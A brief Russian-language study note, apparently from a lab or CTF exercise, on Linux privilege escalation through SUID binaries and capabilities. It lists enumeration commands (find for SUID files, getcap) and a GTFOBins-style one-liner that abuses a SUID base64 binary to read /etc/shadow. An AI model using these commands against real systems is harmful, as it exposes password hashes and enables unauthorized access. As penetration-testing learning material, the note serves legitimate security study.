# Повышение привилегий в Linux SUID

find / -type f -perm -04000 -ls 2>/dev/null 
Везде где есть x там s значит модем пользоваться относительно 
будет перечислять файлы, которые имеют набор битов SUID или SGID. 
Хорошей практикой было бы сравнить исполняемые файлы в этом списке с GTFOBins (https://gtfobins.github.io). 
Исходя из практического примера  мы увидели что suid бит есть в base64
посмотрев на gtfoBins мы смогли расшифровать хеш пароля пользователя и прочесть файлы которые раньше были нам не доступны 
Вот пример
base64 /path/to/input-file | base64 --decode
На практике 
LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode

Можно так же поднять привилегии с помощью capabiliti
 проверяем capabiliti на машине после находим уязвимые capabiliti командой
getcap -r / 2>/dev/null
После идем в gtfobins и проверяем нашу уязвимость
